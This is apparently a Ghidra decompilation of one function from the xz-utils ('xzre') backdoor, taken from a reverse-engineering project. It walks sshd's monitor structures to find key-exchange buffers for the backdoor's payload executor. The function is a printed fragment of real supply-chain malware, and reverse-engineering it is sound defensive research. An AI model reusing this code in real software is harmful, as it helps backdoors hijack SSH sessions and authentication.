// /home/kali/xzre-ghidra/xzregh/107A20_sshd_get_sshbuf.c
// Function: sshd_get_sshbuf @ 0x107A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sshbuf(sshbuf * sshbuf, global_context_t * ctx)


/*
 * AutoDoc: Walks the cached monitor structure to locate the sshbuf that carries key-exchange data, falling back to heuristics if necessary. The payload executor calls it before mining modulus bytes from the session state.
 */
#include "xzre_types.h"


BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)

{
  kex *pkVar1;
  char cVar2;
  byte bVar3;
  byte bVar4;
  monitor *addr;
  BOOL BVar5;
  EncodedStringId EVar6;
  ulong uVar7;
  ulong uVar8;
  kex **addr_00;
  kex *addr_01;
  u64 length;
  uint uVar9;
  
  if (sshbuf == (sshbuf *)0x0) {
    return FALSE;
  }
  if (((ctx != (global_context_t *)0x0) && (ctx->struct_monitor_ptr_address != (monitor **)0x0)) &&
     (BVar5 = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), BVar5 != FALSE)) {
    addr = *ctx->struct_monitor_ptr_address;
    BVar5 = is_range_mapped((u8 *)addr,0x20,ctx);
    if (BVar5 != FALSE) {
      cVar2 = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
      addr_00 = addr->m_pkex;
      if (-1 < cVar2) {
        addr_00 = *(kex ***)((long)&addr->m_recvfd + (long)((int)cVar2 << 2));
      }
      bVar3 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
      bVar4 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
      length = 0x48;
      if (-1 < (char)(bVar4 & bVar3)) {
        uVar8 = (ulong)((int)(char)bVar3 << 3);
        uVar7 = (ulong)((int)(char)bVar4 << 3);
        length = uVar8 + 8;
        if (uVar8 < uVar7) {
          length = uVar7 + 8;
        }
      }
      BVar5 = is_range_mapped((u8 *)addr_00,8,ctx);
      if ((BVar5 != FALSE) && (BVar5 = is_range_mapped((u8 *)*addr_00,0x400,ctx), BVar5 != FALSE)) {
        cVar2 = *(char *)&(ctx->sshd_offsets).field0_0x0;
        addr_01 = *addr_00;
        if (cVar2 < '\0') {
          uVar9 = 0;
          pkVar1 = addr_01 + 0x400;
          for (; addr_01 < pkVar1; addr_01 = addr_01 + 8) {
            BVar5 = is_range_mapped((u8 *)addr_01,length,ctx);
            if ((BVar5 != FALSE) &&
               (BVar5 = sshbuf_extract(*(sshbuf **)addr_01,ctx,&sshbuf->d,&sshbuf->size),
               BVar5 != FALSE)) {
              if (uVar9 < 2) {
                EVar6 = get_string_id((char *)sshbuf->d,(char *)(sshbuf->d + 7));
                if ((EVar6 == STR_SSH_2_0) || (EVar6 == STR_ssh_2_0)) {
                  uVar9 = uVar9 + 1;
                }
              }
              else {
                BVar5 = sshbuf_bignum_is_negative(sshbuf);
                if (BVar5 != FALSE) {
                  return TRUE;
                }
              }
            }
          }
        }
        else {
          BVar5 = sshbuf_extract(*(sshbuf **)(addr_01 + ((int)cVar2 << 3)),ctx,&sshbuf->d,
                                 &sshbuf->size);
          if (BVar5 != FALSE) {
            BVar5 = sshbuf_bignum_is_negative(sshbuf);
            return (uint)(BVar5 != FALSE);
          }
        }
      }
    }
  }
  return FALSE;
}

